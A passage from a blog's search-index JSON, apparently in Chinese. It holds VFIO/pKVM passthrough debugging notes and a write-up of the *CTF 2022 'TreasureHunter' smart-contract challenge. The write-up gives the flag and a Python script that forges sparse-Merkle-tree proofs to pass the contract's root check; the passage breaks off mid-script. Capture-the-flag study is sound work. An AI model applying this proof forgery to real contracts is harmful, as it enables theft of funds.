/sys/bus/platform/devices/fdab0000.npu-guest/driver_override</span><br><span class=\"line\">echo vfio-platform &gt; /sys/bus/platform/devices/fdab0000.npu-guest/driver_override</span><br><span class=\"line\">chmod 777 /sys/bus/platform/drivers/vfio-platform/bind</span><br><span class=\"line\">echo fdab0000.npu-guest &gt; /sys/bus/platform/drivers/vfio-platform/bind</span><br><span class=\"line\"></span><br><span class=\"line\">ls -a /dev/vfio</span><br><span class=\"line\">ls -a /sys/bus/platform/drivers/vfio-platform</span><br><span class=\"line\">r</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[  455.175245] vfio-platform fdab0000.npu-guest: Adding to iommu group 0</span><br><span class=\"line\">[  455.175295] vfio-platform fdab0000.npu-guest: VFIO: No reset function found for device fdab0000.npu-guest</span><br><span class=\"line\">[  455.175311] vfio-platform: probe of fdab0000.npu-guest failed with error -2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li><p>host kernel config</p>\n</li>\n<li><p>host dts</p>\n</li>\n<li><p>host vfio hack 三个检查</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1|rk3588_t:/data/data/com.termux/files/home/opi-pkvm # cat /sys/class/vfio/0/dev</span><br><span class=\"line\">237:0</span><br><span class=\"line\">rk3588_t:/data/data/com.termux/files/home/opi-pkvm # mknod /dev/vfio/0 c 237 0</span><br><span class=\"line\">rk3588_t:/data/data/com.termux/files/home/opi-pkvm # ./boot-pvm.sh </span><br><span class=\"line\">[2025-12-03T06:39:37.635020949+00:00 ERROR crosvm] exiting with error 1: failed to create vfio device</span><br><span class=\"line\"></span><br><span class=\"line\">Caused by:</span><br><span class=\"line\">    failed to add guest memory map into iommu table: Invalid argument (os error 22)</span><br><span class=\"line\">1|rk3588_t:/data/data/com.termux/files/home/opi-pkvm # </span><br></pre></td></tr></table></figure>\n\n<p>VFIO_IOMMU_MAP_DMA</p>\n<p>0-0xffffffff有效 给的va是虚拟机GPA范围 超了</p>\n<p>改小虚拟机内存可以 但是启动虚拟机直接host panic了 这是非pkvm的情况</p>\n","categories":["virtualization"]},{"title":"TreasureHunter","url":"/2024/09/17/ctf/sc/","content":"<h1 id=\"TreasureHunter\"><a href=\"#TreasureHunter\" class=\"headerlink\" title=\"TreasureHunter\"></a>TreasureHunter</h1><p>*CTF 2022 - Ph0t1n1a</p>\n<ul>\n<li>比赛时间：2022-04-16周六 09:00:00——2022-04-17周日 09:00:00 24h</li>\n<li>平台链接：<a href=\"https://starctf2022.xctf.org.cn/\">https://starctf2022.xctf.org.cn/</a></li>\n</ul>\n<p>*ctf{9bd0d273037935c5eeaa94968f107622}</p>\n<p>enter4次+pickupTreasureChest+findKey 核心是构造proof满足root的检验<br><code>keccak256(abi.encode(l, r))</code>碰撞是不可能的 只能记录每个root生成的记录</p>\n<p>用python本地调试</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> eth_abi <span class=\"keyword\">import</span> encode_abi</span><br><span class=\"line\"><span class=\"keyword\">from</span> web3 <span class=\"keyword\">import</span> Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class=\"line\">keccak = w3.keccak</span><br><span class=\"line\"></span><br><span class=\"line\">SMT_STACK_SIZE = <span class=\"number\">32</span></span><br><span class=\"line\">DEPTH = <span class=\"number\">160</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cout = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">abi</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> a!= <span class=\"number\">0</span> <span class=\"keyword\">and</span> b!=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"comment\">#res = encode_abi([&#x27;bytes32&#x27;,&#x27;bytes32&#x27;],[a,b])</span></span><br><span class=\"line\">    res = <span class=\"string\">b&#x27;\\x00&#x27;</span>* (<span class=\"number\">32</span>-<span class=\"built_in\">len</span>(a)) + a + <span class=\"string\">b&#x27;\\x00&#x27;</span>* (<span class=\"number\">32</span>-<span class=\"built_in\">len</span>(b)) + b</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(res) == <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcLeaf</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a.value == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        key_hex = <span class=\"built_in\">hex</span>(a.key)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(key_hex) &amp; <span class=\"number\">1</span>:</span><br><span class=\"line\">            key_hex = <span class=\"string\">&#x27;0&#x27;</span>+ key_hex</span><br><span class=\"line\">        value_hex = <span class=\"string\">b&#x27;\\x00&#x27;</span> <span class=\"keyword\">if</span> a.value == <span class=\"number\">0</span> <span class=\"keyword\">else</span> <span class=\"string\">b&#x27;\\x01&#x27;</span></span><br><span class=\"line\">        res = keccak(abi(<span class=\"built_in\">bytes</span>.fromhex(key_hex), value_hex))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;leaf:<span class=\"subst\">&#123;res.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(res) == <span class=\"number\">32</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">l,r</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> l==<span class=\"number\">0</span>:</span><br><span class=\"line\">        res = r</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> r ==<span class=\"number\">0</span>:</span><br><span class=\"line\">        res = l</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        res = keccak(abi(l, r))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;merge <span class=\"subst\">&#123;l.<span class=\"built_in\">hex</span>()&#125;</span>,<span class=\"subst\">&#123;r.<span class=\"built_in\">hex</span>()&#125;</span> to <span class=\"subst\">&#123;res.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">checkGroupSorted</span>(<span class=\"params\">_leaves</span>):</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(_leaves) &gt;= <span class=\"number\">1</span></span><br><span class=\"line\">        temp = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(_leaves)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> temp &gt;= <span class=\"built_in\">int</span>(_leaves[i].key):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            temp = <span class=\"built_in\">int</span>(_leaves[i].key)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getBit</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key &gt;&gt; height) &amp; <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">copyBit</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key &gt;&gt; height) &lt;&lt; height</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">parentPath</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> copyBit(key,height+<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcRoot</span>(<span class=\"params\">_proofs,_leaves,_root</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> checkGroupSorted(_leaves)</span><br><span class=\"line\">    stackKeys = []</span><br><span class=\"line\">    stackValues = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SMT_STACK_SIZE):</span><br><span class=\"line\">        stackKeys.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        stackValues.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    proofIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">    leaveIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">    stackTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> proofIndex &lt; <span class=\"built_in\">len</span>(_proofs):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x4c</span>:</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop &lt; SMT_STACK_SIZE</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> leaveIndex &lt; <span class=\"built_in\">len</span>(_leaves)</span><br><span class=\"line\">            stackKeys[stackTop] = <span class=\"built_in\">int</span>(_leaves[leaveIndex].key)</span><br><span class=\"line\">            stackValues[stackTop] = calcLeaf(_leaves[leaveIndex])</span><br><span class=\"line\">            stackTop+=<span class=\"number\">1</span></span><br><span class=\"line\">            leaveIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\">#print(f&#x27;push:&#123;stackKeys[stackTop-1]&#125;,&#123;stackValues[stackTop-1]&#125;&#x27;)</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x50</span>:</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop != <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> proofIndex + <span class=\"number\">2</span> &lt;= <span class=\"built_in\">len</span>(_proofs)</span><br><span class=\"line\">            height = <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>)</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            currentProof = _proofs[proofIndex]</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> currentProof != _root</span><br><span class=\"line\">            <span class=\"keyword\">if</span> getBit(stackKeys[stackTop - <span class=\"number\">1</span>], height) == <span class=\"number\">1</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">1</span>] = merge(currentProof, stackValues[stackTop - <span class=\"number\">1</span>])</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">1</span>] = merge(stackValues[stackTop - <span class=\"number\">1</span>], currentProof)</span><br><span class=\"line\">            <span class=\"comment\">#print(stackValues[stackTop - 1])</span></span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">1</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x48</span> :</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop &gt;= <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> proofIndex &lt; <span class=\"built_in\">len</span>(_proofs)</span><br><span class=\"line\">            height = <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>)</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            aSet = getBit(stackKeys[stackTop - <span class=\"number\">2</span>], height)</span><br><span class=\"line\">            bSet = getBit(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">2</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">2</span>], height)</span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">1</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackKeys[stackTop - <span class=\"number\">2</span>] == stackKeys[stackTop - <span class=\"number\">1</span>] <span class=\"keyword\">and</span> aSet != bSet</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> aSet == <span class=\"number\">1</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">2</span>] = merge(</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">1</span>],</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">2</span>]</span><br><span class=\"line\">                    )</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">2</span>] = merge(</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">2</span>],</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">1</span>]</span><br><span class=\"line\">                    )</span><br><span class=\"line\">            stackTop -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span>()</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">assert</span> leaveIndex == <span class=\"built_in\">len</span>(_leaves)</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> stackTop == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> stackValues[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Leaf</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,k,v</span>):</span><br><span class=\"line\">        self.key = k</span><br><span class=\"line\">        self.value = v</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">init</span>():</span><br><span class=\"line\">    hunters = []</span><br><span class=\"line\">    prevLeaves = []</span><br><span class=\"line\">    nextLeaves = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        hunters.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        prevLeaves.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        nextLeaves.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    hunters[<span class=\"number\">0</span>] = <span class=\"number\">0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e</span></span><br><span class=\"line\">    hunters[<span class=\"number\">1</span>] = <span class=\"number\">0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45</span></span><br><span class=\"line\">    hunters[<span class=\"number\">2</span>] = <span class=\"number\">0x6B175474E89094C44Da98b954EedeAC495271d0F</span></span><br><span class=\"line\">    hunters[<span class=\"number\">3</span>] = <span class=\"number\">0x6B3595068778DD592e39A122f4f5a5cF09C90fE2</span></span><br><span class=\"line\">    hunters[<span class=\"number\">4</span>] = <span class=\"number\">0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B</span></span><br><span class=\"line\">    hunters[<span class=\"number\">5</span>] = <span class=\"number\">0xc00e94Cb662C3520282E6f5717214004A7f26888</span></span><br><span class=\"line\">    hunters[<span class=\"number\">6</span>] = <span class=\"number\">0xD533a949740bb3306d119CC777fa900bA034cd52</span></span><br><span class=\"line\">    hunters[<span class=\"number\">7</span>] = <span class=\"number\">0xdAC17F958D2ee523a2206206994597C13D831ec7</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        prevLeaves[i] = Leaf(hunters[i],<span class=\"number\">0</span>)</span><br><span class=\"line\">        nextLeaves[i] = Leaf(hunters[i],<span class=\"number\">1</span>)</span><br><span class=\"line\">    proof = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">22</span>):</span><br><span class=\"line\">        proof.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000095&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000099&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] =<span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009b&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">19</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">20</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">21</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">22</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getProof</span>(<span class=\"params\">b1,b2,h</span>):</span><br><span class=\"line\">    proof = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = h</span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = b1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = b2</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> proof</span><br><span class=\"line\"></span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter1</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter2</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 根据顺序调整height </span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter3</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter4</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter5</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span 